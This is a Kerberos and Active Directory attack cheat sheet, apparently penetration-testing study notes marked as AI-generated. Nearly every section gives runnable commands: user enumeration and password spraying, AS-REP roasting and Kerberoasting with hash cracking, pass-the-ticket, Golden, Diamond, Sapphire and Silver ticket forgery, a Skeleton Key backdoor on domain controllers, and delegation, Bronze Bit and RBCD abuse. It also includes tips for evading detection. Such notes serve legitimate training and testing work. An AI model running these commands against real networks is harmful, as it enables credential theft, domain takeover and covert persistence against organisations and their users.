# Kerberos

#Kerberos #ActiveDirectory #authentication #ticketing #AD

## What is Kerberos?

Network authentication protocol used by Active Directory. Based on tickets — clients obtain a Ticket-Granting Ticket (TGT) from the KDC, then request Service Tickets (TGS) for individual services. Replaces NTLM for AD auth in modern environments.

> [!note] How a client/server *chooses* Kerberos vs NTLM on the wire (`Authorization: Negotiate`), and where it gets downgraded to NTLM: [[Standards & Protocols/SPNEGO-GSS|SPNEGO / GSS-API]].

- Port: **TCP/UDP 88** — Kerberos
- Port: **TCP/UDP 464** — kpasswd (password change)
- KDC runs on every Domain Controller
- Kerberos auth uses clocks — must be within **5 minutes** of DC or auth fails

---

## Key Concepts

| Term | Description |
|---|---|
| KDC | Key Distribution Center — runs on DC (AS + TGS) |
| AS | Authentication Service — issues TGT |
| TGS | Ticket Granting Service — issues service tickets |
| TGT | Ticket Granting Ticket — proves identity, used to request TGS |
| ST / TGS | Service Ticket — grants access to specific service |
| SPN | Service Principal Name — identifies service (e.g., `MSSQLSvc/host:1433`) |
| PAC | Privilege Attribute Certificate — group membership embedded in ticket |
| RC4/AES | Encryption types (RC4 = NTLM hash, AES = AES keys) |
| S4U2Self | Kerberos extension letting a service request a ticket to itself on behalf of any user (no password needed) — the first half of constrained delegation, and the primitive Bronze Bit abuses |
| S4U2Proxy | Kerberos extension letting a service use the ticket from S4U2Self to request a service ticket to a *different* target on behalf of that user — the actual "delegation" step |

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|Nmap]] | `krb5-enum-users` NSE script — unauthenticated user enumeration |
| [[Tools/Auth/Kerbrute\|Kerbrute]] | Fast user enumeration and password spraying against Kerberos pre-auth |
| [[Tools/AD/impacket-kerberos-scripts\|impacket (GetNPUsers/GetUserSPNs/ticketer/etc.)]] | AS-REP Roasting, Kerberoasting, ticket forging, delegation enumeration — the network-facing Kerberos attack scripts |
| [[Tools/Lateral Movement/impacket\|impacket (psexec/wmiexec/smbexec)]] | Use a stolen/forged ticket to get a shell |
| [[Tools/Lateral Movement/Rubeus\|Rubeus]] | Windows — ticket dumping, roasting, forging (Golden/Diamond/Sapphire), PTT, S4U abuse, Bronze Bit |
| [[Tools/Credential Dumping/mimikatz\|mimikatz]] | Ticket export/import, Golden/Silver Ticket forging, DCSync for krbtgt hash, Skeleton Key |
| [[Tools/Lateral Movement/Evil WinRM\|evil-winrm]] | WinRM shell using a Kerberos ticket |
| [[Tools/Lateral Movement/SpoolSample\|SpoolSample.exe]] | Coerce a DC to authenticate (MS-RPRN) — triggers TGT capture on unconstrained delegation |
| [[Tools/AD/rbcd\|rbcd.py]] | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` to set up RBCD |
| [[Tools/Auth/hashcat\|hashcat]] | Offline cracking of AS-REP (mode 18200) and TGS (mode 13100/19700) hashes |
| [[Tools/Auth/john the ripper\|John the Ripper]] | Alternative offline cracker for AS-REP/TGS hashes |

---

## Enumeration

```bash
# Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<domain>,userdb=users.txt <target>

# kerbrute — user enumeration (no auth required)
kerbrute userenum --dc <dc_ip> -d <domain> users.txt
kerbrute userenum --dc <dc_ip> -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute passwordspray --dc <dc_ip> -d <domain> users.txt 'Password123'

# Sync clock to DC (required for Kerberos)
sudo ntpdate <dc_ip>
```

---

## Attack Vectors

### AS-REP Roasting

Users with `Do not require Kerberos preauthentication` set — AS-REP hash obtainable without credentials.

```bash
# Impacket — no credentials needed
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip>
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <dc_ip> -request -format hashcat

# impacket with domain user (enumerate all no-preauth users)
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <dc_ip> -request

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack hash (mode 18200)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Kerberoasting

Request TGS tickets for service accounts (SPNs) — encrypted with service account NTLM hash. Offline crackable.

```bash
# Impacket — list SPNs and request tickets
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast_hashes.txt

# Target specific user
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -target-domain <domain>

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Crack hash (mode 13100 = RC4, 19700 = AES256)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt   # AES256
```

> [!note]
> Microsoft is enforcing AES for accounts without an explicit `msDS-SupportedEncryptionTypes` starting April 2026 — expect more AES256 (mode 19700) tickets and fewer easy RC4 (mode 13100) ones going forward. AES256 cracks far slower than RC4, so weak-password SPN accounts are still worth roasting, just don't expect RC4-speed cracking on a hardened target.

### Targeted Kerberoasting

If you hold DACL write rights (`GenericAll`/`GenericWrite`/`WriteProperty` on `servicePrincipalName`, or `Validated-SPN`) over an account that doesn't normally have an SPN, add one temporarily to make it kerberoastable — turns a DACL foothold into a crackable credential on an account standard Kerberoasting wouldn't have touched.

```powershell
# Add a temporary SPN to the victim account (PowerView)
Set-DomainObject -Identity <victim_user> -Set @{serviceprincipalname='nonexistent/BLAH'}
```

```bash
# Kerberoast the now-SPN-bearing account
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -target-domain <domain>
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# Remove the SPN afterward to restore the account and reduce detection risk
Set-DomainObject -Identity <victim_user> -Clear serviceprincipalname
```

### Pass-the-Ticket (PTT)

Use stolen/forged Kerberos tickets without knowing the password.

```bash
# Export tickets (Windows — mimikatz)
sekurlsa::tickets /export
# or
.\Rubeus.exe dump /nowrap

# Import ticket for use (mimikatz)
kerberos::ptt ticket.kirbi

# Import ticket (Rubeus)
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Impacket — use .ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec <domain>/<user>@<target> -k -no-pass
impacket-wmiexec <domain>/<user>@<target> -k -no-pass
evil-winrm -i <target> -u <user> -r <domain>
```

### Overpass-the-Hash / Pass-the-Key

Use NT hash or AES key to get a TGT (avoids NTLM and gets Kerberos ticket).

```bash
# Impacket — get TGT using NTLM hash (RC4)
impacket-getTGT <domain>/<user> -hashes :<NTLM_hash> -dc-ip <dc_ip>

# Impacket — get TGT using AES key
impacket-getTGT <domain>/<user> -aesKey <AES256_key> -dc-ip <dc_ip>

# Use resulting .ccache
export KRB5CCNAME=<user>.ccache
impacket-psexec <domain>/<user>@<target> -k -no-pass

# Mimikatz — overpass-the-hash (inject NTLM → get TGT)
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe

# Rubeus — overpass-the-hash
.\Rubeus.exe asktgt /user:<user> /rc4:<NTLM_hash> /ptt
.\Rubeus.exe asktgt /user:<user> /aes256:<AES256_key> /ptt
```

### Golden Ticket

Forged TGT using the `krbtgt` account NTLM hash. Grants access to any service in the domain indefinitely.

```bash
# Requirements: krbtgt hash, domain SID

# Get krbtgt hash (post-DA compromise)
# mimikatz:
lsadump::dcsync /user:krbtgt

# Get domain SID
impacket-lookupsid <domain>/<user>:<pass>@<dc_ip> | grep "Domain SID"
# or: wmic computersystem get domain / powershell (Get-ADDomain).DomainSID

# Forge golden ticket (mimikatz)
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_NTLM_hash> /ptt

# Impacket — create golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain <domain> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass
```

### Diamond Ticket

Requests a *real* TGT for a legitimate user, then decrypts and modifies its PAC in place (injecting privileged group SIDs like Domain Admins) before re-encrypting with the krbtgt key — unlike Golden Ticket's forge-from-scratch approach, this leaves out several of the anomalies Golden Ticket detections look for (no matching AS-REQ, default 10-year lifetime, etc.), since a real ticket lifecycle actually happened.

**Conditions:** krbtgt hash (same prerequisite as Golden Ticket).

```powershell
# Rubeus — request a real TGT then rewrite its PAC to add Domain Admins (RID 512)
.\Rubeus.exe diamond /krbkey:<krbtgt_AES256_or_RC4_key> /enctype:aes /user:<user> /password:<pass> /domain:<domain> /dc:<dc_fqdn> /ticketuser:<user> /ticketuserid:<user_rid> /groups:512 /ptt
```

### Sapphire Ticket

Goes further than Diamond Ticket: instead of hand-editing the PAC, obtains a genuinely-issued PAC for the target identity from the KDC itself via S4U2Self+U2U, then splices that real PAC into the TGT. Every field is authentic — no fabricated SIDs — making Sapphire Tickets the hardest forged-ticket variant to detect.

**Conditions:** krbtgt hash.

```powershell
# Rubeus — forge a Sapphire Ticket using a real PAC pulled via S4U2Self+U2U
.\Rubeus.exe sapphire /krbtgt:<krbtgt_NT_hash> /user:Administrator /domain:<domain> /dc:<dc_fqdn> /outfile:sapphire.kirbi
```

### Silver Ticket

Forged TGS (service ticket) using the service account hash. Grants access to a specific service without touching the KDC.

```bash
# Requirements: service account NTLM hash, domain SID, SPN

# Forge silver ticket (mimikatz)
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /target:<target_fqdn> \
  /service:cifs /rc4:<service_account_NTLM> /ptt

# Impacket
impacket-ticketer -nthash <service_account_hash> -domain-sid <domain_SID> \
  -domain <domain> -spn cifs/<target_fqdn> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbexec <domain>/Administrator@<target> -k -no-pass
```

### Skeleton Key

Persistence technique — patches LSASS in memory on a DC to accept a second, attacker-chosen master password for **every** domain account, in addition to each account's real password. Requires DA/SYSTEM on a DC. It's an in-memory patch only — doesn't survive a reboot — so it's typically re-applied via a scheduled task or other persistence mechanism if long-term access is needed.

**Conditions:** DA or SYSTEM access on a Domain Controller.

```powershell
# On a DC, with SYSTEM/DA — mimikatz
privilege::debug
misc::skeleton
```

```bash
# Authenticate as ANY domain user using the skeleton password (default: "mimikatz")
impacket-psexec <domain>/Administrator:mimikatz@<dc_ip>
```

> [!warning]
> Skeleton Key doesn't remove or change the real password — it's purely additive. Both the real password and the skeleton password work simultaneously, which is what makes it easy to miss without LSASS-integrity monitoring on DCs.

### Unconstrained Delegation

```bash
# Find machines with unconstrained delegation (stores TGTs of connecting users)
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc_ip>
ldapsearch -H ldap://<dc_ip> -x -D "<user>@<domain>" -w '<pass>' -b "DC=domain,DC=com" \
  "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" name

# Force DC to authenticate to compromised server (PrinterBug / MS-RPRN)
.\SpoolSample.exe <dc_ip> <compromised_server>

# Capture TGT from DC via Rubeus
.\Rubeus.exe monitor /interval:5 /filteruser:DC$

# Pass TGT to get DA access
.\Rubeus.exe ptt /ticket:<base64_TGT>
```

### Constrained Delegation

```bash
# Find constrained delegation configured services
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc_ip>

# If you have the service account hash — request TGS on behalf of any user (S4U2Proxy)
.\Rubeus.exe s4u /user:<svc_user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_SPN> /ptt

# Impacket
impacket-getST -spn <target_SPN> -impersonate Administrator <domain>/<svc_user>:<pass> -dc-ip <dc_ip>
```

### Bronze Bit (CVE-2020-17049)

Bypasses the "forwardable" flag check in S4U2Proxy: the flag on the S4U2Self ticket is only protected by the encrypting service account's own key, so a compromised service account can flip it and forge a *forwardable* ticket for a user — even one flagged "This account is sensitive and cannot be delegated," which constrained delegation is supposed to respect. Patched November 2020.

**Conditions:** control of a service account configured for constrained delegation; target unpatched (pre-Nov-2020) or otherwise vulnerable.

```powershell
# Rubeus — /bronzebit automatically flips the forwardable bit on the S4U2Self ticket
.\Rubeus.exe s4u /user:<svc_user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_SPN> /bronzebit /ptt
```

> [!warning]
> Patched November 2020 — check the target's patch level before assuming this bypass still works.

### Resource-Based Constrained Delegation (RBCD)

```bash
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object
# Add controlled computer account to target's allowed delegation

# Add computer account
impacket-addcomputer <domain>/<user>:<pass> -dc-ip <dc_ip> -computer-name 'EVIL$' -computer-pass 'Password123'

# Set RBCD
python3 rbcd.py -f EVIL -t <target_computer> -dc-ip <dc_ip> '<domain>/<user>:<pass>'

# Get service ticket impersonating admin
impacket-getST -spn cifs/<target_fqdn> -impersonate Administrator -dc-ip <dc_ip> \
  '<domain>/EVIL$:Password123'

export KRB5CCNAME=Administrator.ccache
impacket-wmiexec <domain>/Administrator@<target> -k -no-pass
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No Kerberos preauthentication | AS-REP Roasting |
| Weak service account passwords with SPN | Kerberoasting |
| Writable DACL on an account without an SPN | Targeted Kerberoasting — attacker adds an SPN to make it roastable |
| Unconstrained delegation | TGT theft from authenticating users |
| Constrained delegation misconfiguration | Impersonation of any user |
| Service account with constrained delegation compromised | Bronze Bit — forwardable-flag bypass reaches "cannot be delegated" accounts |
| Writable `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD — attacker-controlled computer account granted delegation rights |
| krbtgt hash compromised | Golden, Diamond, and Sapphire Ticket forgery — increasingly hard to detect in that order |
| DA/SYSTEM on a DC without LSASS integrity monitoring | Skeleton Key — silent universal-password backdoor |
| Old Kerberos encryption (RC4 only, no AES) | Faster hash cracking |

---

## Quick Reference

| Goal | Command |
|---|---|
| User enum | `kerbrute userenum --dc dc_ip -d domain users.txt` |
| AS-REP Roast | `impacket-GetNPUsers domain/ -no-pass -usersfile users.txt -dc-ip dc_ip` |
| Crack AS-REP | `hashcat -m 18200 hashes.txt rockyou.txt` |
| Kerberoast | `impacket-GetUserSPNs domain/user:pass -dc-ip dc_ip -request` |
| Crack TGS | `hashcat -m 13100 hashes.txt rockyou.txt` |
| Get TGT (hash) | `impacket-getTGT domain/user -hashes :NTLM -dc-ip dc_ip` |
| Pass-the-Ticket | `export KRB5CCNAME=ticket.ccache; impacket-psexec ... -k -no-pass` |
| Golden ticket | `impacket-ticketer -nthash krbtgt_hash -domain-sid SID -domain domain Administrator` |
| Diamond ticket | `Rubeus.exe diamond /krbkey:<key> /enctype:aes /user:user /password:pass /ticketuser:user /groups:512 /ptt` |
| Sapphire ticket | `Rubeus.exe sapphire /krbtgt:<hash> /user:Administrator /domain:domain /dc:dc_fqdn` |
| Skeleton Key | `mimikatz # misc::skeleton` (then auth as anyone with password `mimikatz`) |
| Bronze Bit | `Rubeus.exe s4u /user:svc /rc4:hash /impersonateuser:Administrator /msdsspn:SPN /bronzebit /ptt` |
| Find delegation | `impacket-findDelegation domain/user:pass -dc-ip dc_ip` |
| Sync clock | `sudo ntpdate dc_ip` |

---

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Metasploit|Metasploit]] — the Kerberos/AD module suite (forge_ticket golden/silver/diamond/sapphire, pass-the-ticket → DCSync) that mirrors these techniques from inside the framework.

---

*Created: 2026-07-27*
*Updated: 2026-07-31*
*Model: claude-opus-5*
